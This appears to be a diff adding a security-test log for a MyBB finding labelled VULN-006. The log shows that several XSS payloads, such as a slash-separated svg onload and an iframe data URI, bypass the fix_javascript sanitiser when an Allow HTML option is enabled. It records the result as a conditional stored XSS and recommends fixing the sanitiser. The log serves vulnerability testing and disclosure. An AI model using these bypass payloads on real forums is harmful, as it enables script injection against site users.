@@ -1,0 +1,16 @@
+========================================================================
+VULN-006: fix_javascript bypass -> stored XSS when Allow HTML is enabled
+Target: http://localhost:25850
+========================================================================
+[INFO] running MyBB's own postParser::parse_message(allow_html=1) on bypass payloads
+[WARN] CONDITIONAL: requires an operator to enable an Allow HTML flag (all four default OFF)
+[INFO]   img_space_onerror  -> neutralised=True handler/tag intact=False | <img src=x on‌error=alert(1)>
+[INFO]   svg_slash_onload   -> neutralised=False handler/tag intact=True | <svg/onload=alert(1)>
+[INFO]   img_slash_onerror  -> neutralised=False handler/tag intact=True | <img src=x/onerror=alert(1)>
+[INFO]   iframe_data        -> neutralised=False handler/tag intact=True | <iframe src=data:text/html,alert(1)></iframe>
+[PROOF] control: `<img src=x onerror=>` IS neutralised (U+200C inserted) — the sanitiser runs
+[PROOF] bypass: <svg/onload=>, <img src=x/onerror=>, <iframe src=data:> pass through fix_javascript UN-neutralised and render as live HTML — stored XSS when an Allow HTML flag is enabled
+------------------------------------------------------------------------
+[OK] exploit confirmed — fix_javascript is bypassable; dangerous HTML survives in allow_html mode
+[WARN] not reachable on the documented secure baseline (Allow HTML flags default off); fix the sanitiser regardless of the flag
+==> VULN-006: CONFIRMED (conditional) — fix_javascript '/'-separator & non-event bypass -> stored XSS when an Allow HTML flag is enabled (default off)
